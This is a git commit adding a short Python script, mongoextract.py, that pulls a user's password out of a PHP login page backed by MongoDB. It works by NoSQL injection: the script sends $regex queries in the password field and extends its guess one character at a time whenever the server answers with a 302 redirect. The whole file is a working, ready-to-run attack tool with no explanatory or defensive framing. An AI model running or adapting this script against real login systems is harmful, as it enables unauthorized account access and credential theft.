d71b02ec9a1ccae893d085afc5f9dd997110c712
afsinguven <54002670+afsinguven@users.noreply.github.com>
2019-11-05 10:06:39 +0300

    Create mongoextract.py
    First commit

---
+++ mongoextract.py
@@ -0,0 +1,43 @@
+#Script for extracting passwords from vulnerable php logins using mongodb
+import requests
+import urllib3
+import string
+import urllib
+#urllib3.disable_warnings()
+
+username = 'admin'
+password = ''
+method = 'post'
+url = 'http://127.0.01/index.php'
+pname = 'password'
+uname = 'username'
+loop = 0
+
+def makeRequest(tpassword=''):
+  if method == 'get':
+    r = requests.get(url+'?'+'%s='%(uname)+'%s'%(username)+'&%s[$regex]=^'%(pname)+tpassword,allow_redirects=False)
+  else:
+    payload={'%s'%(uname):'%s'%(username),'%s[$regex]'%(pname):'^%s'%(tpassword)}
+    r = requests.post(url,data=payload,allow_redirects=False)
+  return r
+
+
+r=makeRequest('.*')
+if r.status_code != 302:
+  print('Could not verify mongodb injection, please check your arguments and or username supplied')
+  exit()
+
+print('Extracting password for user:%s'%(username))
+
+while loop<2:
+  loop += 1
+  for c in string.printable:
+    if c not in ['*','+','.','?','|', '#', '&', '$']:
+          tpassword=password+c
+    else:
+          tpassword=password+'\\'+c
+    r=makeRequest(tpassword)
+    if r.status_code == 302:
+      password += c
+      print("Found one more char : %s" % (password))
+      loop=0
